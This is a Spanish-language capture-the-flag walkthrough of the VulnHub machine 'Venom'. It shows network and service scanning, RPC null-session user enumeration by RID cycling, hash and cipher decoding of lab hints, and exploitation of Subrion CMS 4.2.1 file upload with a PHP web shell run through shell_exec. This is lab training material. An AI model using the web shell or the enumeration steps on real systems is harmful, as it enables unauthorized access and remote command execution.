# VULNHUB PEN TESTING LABS
## MACHINE VENOM
> ![alt text](https://i.postimg.cc/fLBRmJwQ/venom.png)
---

### Sinopsis 
Venom es una máquina Linux categorizado como fácil en vulnhub.
### Habilidades Aprendidas

> * Enumeración y escaneo.
>   * Puertos TCP y UDP.
> * RPC Enumeración.
> * FTP Enumeración.
> * RPC RID Cycling Attack (Manual brute force) + xargs Boots Speed.
>   * Tip - Discovering valid system users.
> * Crypto Vigenere Cipher
> * Subrion CMS v4.2.1 Exploitation - Arbitrary File Upload (Phar files) [RCE]
> * Listing system files and discovering privileged information
> * Abusing SUID binary (find) [Privilege Escalation]
> * Desubrimiento de información mediente openssl.


## Enumeración y Escaneo

Para iniciar la fase de reconocimiento, se utilizara la herramienta `arp-scan` para identificar la ip del equipo.

#### Enumeración de la red.
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/nmap]
└─$ sudo arp-scan -I eth0 --localnet                                                  
[sudo] contraseña para s3cur1ty3c: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:34:f8:0f, IPv4: 192.168.200.147
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:f9:1b:b3       VMware, Inc.
192.168.200.149 00:0c:29:ea:dd:56       VMware, Inc.
192.168.200.254 00:50:56:fa:0c:8d       VMware, Inc.
4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.085 seconds (122.78 hosts/sec). 4 responded
```
A continuación el significado de los parametros de arp-scan, ademas identificamos que el equio encontrado es el `192.168.200.149`

>* *-I*: Flag para establecer porque interface va salir el escaneo.
>* *ens33*: Nombre de la interface en la que se va ejecutar el escaneo.
>* *--localnet*: especifica que el escaneo se ejecute en la red interna.

### Escaneo y enumeración de servicios
Para la etapa de identificación de viulnerabilidades utilizamos la herramienta *_nmap_*, que servirá para verificar los servicioes y puertos expuestos.

#### Identicación de puertos y servicios con nmap. 65535 Puertos.
```bat
# nmap -p- --open -T5 -v -n -oG allPorts 192.168.200.149
# nmap  -p- --open -sS --min-rate 5000-vvv -n -Pn 192.168.200.149 -oG allPorts
```
A continuación el significado de los parametros de nmap.

>* *_-p-_*: Ejecuta la validación sobre todos los puertos 65535.
>* *_-T[0-5]_*: Corresponde a la plantilla del temporizado entre mas alto es el numero, el escaneo es mas rapido y mas ruidoso o intrusivo, el numero 5 es ideal para entornos controlados.
>* *_-v_*: Aumentar el nivel de mensajes detallados (use -vvv para aumentar el efecto).
>* *_-n_*: Le indica a Nmap que nunca debe realizar resolución DNS inversa de las direcciones IP activas que encuentre. Ya que DNS es generalmente lento, esto acelera un poco las cosas.
> * *_-Pn_*: Este parametro evita que se aplique resolución de host discovery, a travéz del protocolo arp.
> * *_-oG_*: -oN/-oX/-oS/-oG \<file>: Guardar el sondeo en formato normal, y Grepeable (para usar con grep) respectivamente, al archivo indicado.
> * *_-sS_*: Análisis TCP SYN/Connect()/ACK.
> * *_--min-rate 5000_*: emite paquete no mas lentos a 5000 paquetes por segundo.
> * *_--open_*: muestra solo los puertos abiertos.

#### Resultado formato grepeable -oG

```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/nmap]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvvv -n -Pn 192.168.200.149 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 16:09 -05
Initiating ARP Ping Scan at 16:09
Scanning 192.168.200.149 [1 port]
Completed ARP Ping Scan at 16:09, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 16:09
Scanning 192.168.200.149 [65535 ports]
Discovered open port 21/tcp on 192.168.200.149
Discovered open port 445/tcp on 192.168.200.149
Discovered open port 443/tcp on 192.168.200.149
Discovered open port 80/tcp on 192.168.200.149
Discovered open port 139/tcp on 192.168.200.149
Completed SYN Stealth Scan at 16:09, 3.45s elapsed (65535 total ports)
Nmap scan report for 192.168.200.149
Host is up, received arp-response (0.0011s latency).
Scanned at 2023-01-10 16:09:13 -05 for 3s
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
443/tcp open  https        syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 00:0C:29:EA:DD:56 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)                                                                        
```
Una vez escaneado se puede evidenciar que encontró abierto los puertos, para lo que se puede ejecutar un escaneo mejorado a nivel se scritps con nmap.
#### Resultado formato nmap -oN
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/nmap]
└─$ sudo nmap -p21,80,139,443,445 -sCV -vvvv 192.168.200.149 -oN targeted             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 16:10 -05
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Initiating ARP Ping Scan at 16:10
Scanning 192.168.200.149 [1 port]
Completed ARP Ping Scan at 16:10, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:10
Completed Parallel DNS resolution of 1 host. at 16:10, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:10
Scanning 192.168.200.149 [5 ports]
Discovered open port 139/tcp on 192.168.200.149
Discovered open port 80/tcp on 192.168.200.149
Discovered open port 21/tcp on 192.168.200.149
Discovered open port 443/tcp on 192.168.200.149
Discovered open port 445/tcp on 192.168.200.149
Completed SYN Stealth Scan at 16:10, 0.05s elapsed (5 total ports)
Initiating Service scan at 16:10
Scanning 5 services on 192.168.200.149
Completed Service scan at 16:10, 11.03s elapsed (5 services on 1 host)
NSE: Script scanning 192.168.200.149.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 5.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.09s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Nmap scan report for 192.168.200.149
Host is up, received arp-response (0.00072s latency).
Scanned at 2023-01-10 16:10:40 -05 for 17s

PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 64 vsftpd 3.0.3
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  http        syn-ack ttl 64 Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 00:0C:29:EA:DD:56 (VMware)
Service Info: Hosts: VENOM, 127.0.1.1; OS: Unix

Host script results:
|_clock-skew: mean: -6h49m59s, deviation: 3h10m30s, median: -5h00m00s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-01-10T16:10:53
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61562/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62949/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 40776/udp): CLEAN (Failed to receive data)
|   Check 4 (port 20499/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: VENOM, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VENOM<00>            Flags: <unique><active>
|   VENOM<03>            Flags: <unique><active>
|   VENOM<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: venom
|   NetBIOS computer name: VENOM\x00
|   Domain name: \x00
|   FQDN: venom
|_  System time: 2023-01-10T21:40:53+05:30

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:10
Completed NSE at 16:10, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.50 seconds
           Raw packets sent: 6 (248B) | Rcvd: 6 (248B)
```
A continuación el significado de los parametros de nmap.

>* *_-sC_*: Escanee conn scripts básicos de enumeración.
>* *_-sV_*: Detecta la version y servicio que corren para los puertos.
>* *_-pNPORTS_*: Que el escanee se ejecute sobre esos puertos.
>* *_-oN_*: Exporte en formato nmap.

#### Desubrimiento de información mediente openssl

Una vez identificado los puertos se puede verificar si exites enumeración de información mediante los certificados con el puerto 443.

```ruby                                                                                                                                                                                         
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/nmap]
└─$ openssl s_client -connect 192.168.200.149:443
CONNECTED(00000003)
4067AFE6DB7F0000:error:0A00010B:SSL routines:ssl3_get_record:wrong version number:../ssl/record/ssl3_record.c:354:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 5 bytes and written 423 bytes
Verification: OK
---
New, (NONE), Cipher is (NONE)
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
```
Mediante el escaneo de enumeración `-sCV` se identificó el puerto ftp 21 esta abierto, por lo que, se valido que no existe acceso mediante usuario anonymous

```ruby  
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/nmap]
└─$ ftp 192.168.200.149
Connected to 192.168.200.149.
220 (vsFTPd 3.0.3)
Name (192.168.200.149:s3cur1ty3c): anonymous
530 Permission denied.
ftp: Login failed
```

Se identifica que en el codigo fuente de la pagina de apache, existe codigo hash infiltrado que no es originario de la pagina de apache.

```ruby                                                                                                                                                                                          
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/
nmap]
└─$ curl -s -X GET http://192.168.200.149
...
    </div>
    </div>
    <div class="validator">
    </div>
  </body>
</html>
<!...<5f2a66f947fa5690c26506f66bde5c23> follow this to get access on somewhere.....-->

```
#### Crackhashes
Con el hash encontrado, se puede identificar el tipo de hash, utilizando la herramienta `hash-identifier` y se puede utilizar [crackstation](https://crackstation.net/), como resultado obtendremos la credencial *hostinger*

```ruby  
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/nmap]
└─$ hash-identifier 5f2a66f947fa5690c26506f66bde5c23 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
#### Enumeración de recursos compartidos smb

En el puerto 445, se puede validar los recursos compartidos utilizando smbmap

```ruby 
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ smbmap -H 192.168.200.149
[+] Guest session       IP: 192.168.200.149:445 Name: 192.168.200.149                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (venom server (Samba, Ubuntu))
```
En el paso anterior se valido que existen recursos compartidos pero de los cuales no hay acceso.

#### Enumeración de recursos compartidos RPC

Con el puerto RPC --> 139, se puede se puede hacer una validación para acceder por null sesion, con la herramienta rpcclient.

```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ rpcclient -U "" 192.168.200.149 -N
rpcclient $> srvinfo
        VENOM          Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
rpcclient $> 
```
Aprovechando que existe la vulnerabilidad de null sesion, se puede aprovecha para recolectar información. con el flag -c se puede emitir un comando, y el comando lsaenumsid, permite listar los usuarios
Tambien se puede hacer un descubrimiento a nivel nombres de usuario, y esto permite extaer el RID del usuario, esto se puede ejecutar con el comando `lookupnames`.
```ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ rpcclient -N -U "" 192.168.200.149 -c "lookupnames root" 
root S-1-22-1-0 (User: 1)
```  
Una vez identificado lo los RID de usuarios del sistema, se puede ejecutar un secuenciador para hacer enumeración de los usuarios.
```ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ seq 1 1500 | xargs -P 50 -I {} rpcclient -N -U "" 192.168.200.149 -c "lookupsids S-1-22-1-{}" | grep -oP '.*User\\[a-z].*\s'
S-1-22-1-5 Unix User\games 
S-1-22-1-1 Unix User\daemon 
S-1-22-1-4 Unix User\sync 
S-1-22-1-7 Unix User\lp 
S-1-22-1-6 Unix User\man 
S-1-22-1-13 Unix User\proxy 
S-1-22-1-9 Unix User\news 
S-1-22-1-8 Unix User\mail 
S-1-22-1-2 Unix User\bin 
S-1-22-1-10 Unix User\uucp 
S-1-22-1-3 Unix User\sys 
S-1-22-1-34 Unix User\backup 
S-1-22-1-33 Unix User\www-data 
S-1-22-1-41 Unix User\gnats 
S-1-22-1-38 Unix User\list 
S-1-22-1-39 Unix User\irc 
S-1-22-1-100 Unix User\systemd-network 
S-1-22-1-101 Unix User\systemd-resolve 
S-1-22-1-103 Unix User\messagebus 
S-1-22-1-119 Unix User\pulse 
S-1-22-1-102 Unix User\syslog 
S-1-22-1-111 Unix User\speech-dispatcher 
S-1-22-1-107 Unix User\usbmux 
S-1-22-1-109 Unix User\rtkit 
S-1-22-1-110 Unix User\cups-pk-helper 
S-1-22-1-108 Unix User\dnsmasq 
S-1-22-1-105 Unix User\uuidd 
S-1-22-1-106 Unix User\avahi-autoipd 
S-1-22-1-112 Unix User\whoopsie 
S-1-22-1-114 Unix User\saned 
S-1-22-1-113 Unix User\kernoops 
S-1-22-1-116 Unix User\colord 
S-1-22-1-118 Unix User\geoclue 
S-1-22-1-121 Unix User\gdm 
S-1-22-1-122 Unix User\mysql 
S-1-22-1-117 Unix User\hplip 
S-1-22-1-120 Unix User\gnome-initial-setup 
S-1-22-1-115 Unix User\avahi 
S-1-22-1-123 Unix User\ftp 
S-1-22-1-999 Unix User\vboxadd 
S-1-22-1-1002 Unix User\hostinger 
S-1-22-1-1000 Unix User\nathan 
```
Con los usuarios identificados procedemos hacer pruebas accediendo por el servicio ftp, con el usuario hostinger.
```ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ ftp 192.168.200.149
Connected to 192.168.200.149.
220 (vsFTPd 3.0.3)
Name (192.168.200.149:s3cur1ty3c): hostinger
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir 
229 Entering Extended Passive Mode (|||48088|)
150 Here comes the directory listing.
drwxr-xr-x    2 1002     1002         4096 May 21  2021 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||41760|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             384 May 21  2021 hint.txt
226 Directory send OK.
ftp> get hint.txt
local: hint.txt remote: hint.txt
229 Entering Extended Passive Mode (|||44855|)
150 Opening BINARY mode data connection for hint.txt (384 bytes).
100% |***********************************************************************************************************************************************|   384        4.12 KiB/s    00:00 ETA
226 Transfer complete.
384 bytes received in 00:00 (4.06 KiB/s)
ftp> 
```
En la ejecucion anterior, fue correcta el acceso por ftp, con el comando get descargamos el archivo hint.txt, para ver el contenido en el equipo local.

```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ cat hint.txt 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hint.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │     Hey there... 
   2   │ 
   3   │ T0D0 --
   4   │ 
   5   │ * You need to follow the 'hostinger' on WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= also aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=
   6   │ * some knowledge of cipher is required to decode the dora password..
   7   │ * try on venom.box
   8   │ password -- L7f9l8@J#p%Ue+Q1234 -> deocode this you will get the administrator password 
   9   │ 
  10   │ 
  11   │ Have fun .. :)
  12   │  
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
De las cadenas encontradas se puede utilizar base64 decode, para descifrar.
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ echo -n "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d | base64 -d | base64 -d
standard vigenere cipher

┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ echo -n "aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=" | base64 -d                            
https://cryptii.com/pipes/vigenere-cipher
```
Con la información encontrada podemos ejecutar decodificacón del cifrado vigenere, del password `L7f9l8@J#p%Ue+Q1234`, para esto podemos utilizar la herramienta recomendada [cryptii](https://cryptii.com/pipes/vigenere-cipher) o [CyberChef](https://gchq.github.io/CyberChef/)
> ![alt text](https://i.postimg.cc/rz6sF7VD/vigenere.png)

De la información obtenida, tambien debemos agregar virtual hosting configurando el host `venom.box`, y con esto prbar acceder por http con el usuario dora, ademas, para obtener mas información utilizaremos `whatweb`.
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ whatweb venom.box      
http://venom.box [200 OK] Apache[2.4.29], Bootstrap, Cookies[INTELLI_06c8042c3d], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.200.149], JQuery, MetaGenerator[Subrion CMS - Open Source Content Management System], Open-Graph-Protocol, PoweredBy[Subrion], Script, Title[Home :: Powered by Subrion 4.2], UncommonHeaders[x-powered-cms], X-UA-Compatible[IE=Edge]
```                                  
Una vez identificado el CMS, se puede buscar en searchsploit si existe alguna vulnerabilidad para `subrion 4.2`

```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/content]
└─$ searchsploit subrion 4.2.1
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                                                                                                   | php/webapps/47469.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                                                                                                    | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                                 | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                                          | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                                                  | php/webapps/45150.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
De los exploits encontrados procedemos a descargar el exploit que permite `Arbitrary File Upload`
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/exploits]
└─$ searchsploit -m php/webapps/49876.py 
  Exploit: Subrion CMS 4.2.1 - Arbitrary File Upload
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
    Codes: CVE-2018-19422
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (956)
Copied to: /home/s3cur1ty3c/CTF/vulnhub/venom/exploits/49876.py

└─$ mv 49876.py subrion_exploit.py
```
Del exploit descargado se encontro información que el CMS, interpreta archivos con extensión.phar, por lo que,debemos crear una web shell y subir en la ruta `http://venom.box/panel/uploads/`.
```ruby
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/exploits]
└─$ cat pwned.phar        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.phar
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   3   │ ?>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Con el archivo subido, validar que la webshell es interpretrada abriendo el archivo desde la ruta `http://venom.box/uploads/pwned.phar?cmd=whoami`, y como resultado veremos el nombre del usuario.
```ruby
<pre>www-data
</pre>
```